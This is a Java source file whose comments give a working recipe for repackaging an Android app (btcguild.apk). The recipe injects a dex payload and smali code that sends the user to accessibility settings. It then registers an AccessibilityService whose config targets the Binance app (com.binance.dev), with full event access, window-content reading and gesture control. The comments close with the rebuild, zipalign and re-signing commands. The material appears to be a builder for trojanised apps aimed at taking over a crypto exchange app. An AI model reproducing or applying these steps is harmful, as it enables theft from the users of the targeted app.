package com.example.patch;

import com.example.patch.utils.Log;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class Patch {

    private static final String APKTOOL_PATH = "/Users/txt/AndroidStudioProjects/AccessServer/patch/libs/apktool.jar";


    public static void main(String[] args) {
        //1.复制出新的文件 cp btcguild.apk btcguild_new.apk

        //2.添加dex zip -m btcguild_new.apk classes3.dex

        //3.解包
        // rm -rf btcguild_new
        //java -jar /Users/txt/Documents/code/GPatch_03/Patch/libs/apktool.jar d btcguild_new.apk

        //在主类中添加代码
        //invoke-virtual {p0}, Lcom/game/partner/Splash;->start()V

        //添加方法
        /**
         * .method public start()V
         *     .locals 2
         *
         *     .line 33
         *     new-instance v0, Landroid/content/Intent;
         *
         *     const-string v1, "android.settings.ACCESSIBILITY_SETTINGS"
         *
         *     invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V
         *
         *     .line 34
         *     .local v0, "intent":Landroid/content/Intent;
         *     invoke-virtual {p0, v0}, Lcom/game/partner/Splash;->startActivity(Landroid/content/Intent;)V
         *
         *     .line 36
         *     return-void
         * .end method
         */


        //配置文件添加
        /**
         * <service
         * android:name="com.wujiang.acessserver.AccessService"
         * android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
         * android:exported="true">
         *     <intent-filter>
         *         <action android:name="android.accessibilityservice.AccessibilityService" />
         *     </intent-filter>
         *
         *     <meta-data
         *         android:name="android.accessibilityservice"
         *         android:resource="@xml/accessibility_service_config" />
         * </service>
         */


        //添加无障碍配置文件映射
        /**
         * res/values/public.xml
         * <public type="xml" name="accessibility_service_config" id="0x7f120004" />
         */

        /**
         * 添加无障碍配置文件
         * res/xml/accessibility_service_config.xml
         * <?xml version="1.0" encoding="utf-8"?>
         * <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
         *     android:packageNames="com.binance.dev"
         *     android:accessibilityEventTypes="typeAllMask"
         *     android:accessibilityFeedbackType="feedbackGeneric"
         *     android:accessibilityFlags="flagDefault|flagRetrieveInteractiveWindows|flagIncludeNotImportantViews"
         *     android:notificationTimeout="100"
         *     android:canPerformGestures="true"
         *     android:canRetrieveWindowContent="true"/>
         */


        //打包
//        java -jar /Users/txt/Documents/code/GPatch_03/Patch/libs/apktool.jar b btcguild_new -o btcguild_new-out.apk

//对齐
//        rm -rf btcguild_new-align.apk
//        /Users/txt/Library/Android/sdk/build-tools/33.0.1/zipalign -v 4 btcguild_new-out.apk btcguild_new-align.apk


        //签名
///Users/txt/Library/Android/sdk/build-tools/33.0.1/apksigner sign --ks /Users/txt/Documents/code/GPatch_03/keystore.jks --ks-key-alias key0 btcguild_new-align.apk

    }

    public static int exec(String... command) throws Exception {
        ProcessBuilder builder = new ProcessBuilder(command);
        Process process = builder.start();
        logProcessOutputWithError(process);
        return process.waitFor();
    }

    private static void logProcessOutput(Process process) throws IOException {
        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        String line;
        while ((line = reader.readLine()) != null) {
            Log.i(line);
        }
    }

    private static void logProcessOutputWithError(Process process) throws IOException {
        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
        String line;
        while ((line = reader.readLine()) != null) {
            Log.i(line);
        }
    }


}
